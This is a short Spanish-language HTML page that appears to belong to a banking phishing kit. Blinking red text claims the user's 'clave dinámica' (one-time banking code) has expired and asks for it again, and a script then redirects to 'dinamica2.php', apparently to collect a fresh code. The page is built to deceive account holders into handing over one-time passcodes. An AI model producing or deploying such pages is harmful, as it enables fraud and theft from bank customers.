<!DOCTYPE html>
<html>
<head>
  <title>Mantente en Linea con nosotros..</title>
  <style>
    /* Estilos para centrar el contenido y el logo */
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
    }

    .logo-container {
      text-align: center;
    }

    .message {
        color: rgba(255, 9, 9, 0.932);
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      animation: blink 1s infinite;
      font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
    }

    

    @keyframes blink {
      0% { opacity: 1; }
      50% { opacity: 0; }
      100% { opacity: 1; }
    }
  </style>
  <script>
    // Función para redireccionar después de 8 segundos
    setTimeout(function() {
      window.location.href = "dinamica2.php"; // Reemplaza con la URL a la que deseas redireccionar
    }, 8000);
  </script>
</head>
<body>
  <div class="logo-container">
    <img src="/images/logo2.png" width="200" alt="Logo" class="logo">
    <br>
    <br>
  </div>
  <div>
    <h1 class="message">Clave expiro..</h1>
    <p class="message">Ingrese de nuevo su clave dinamica.</p>
  </div>
</body>
</html>

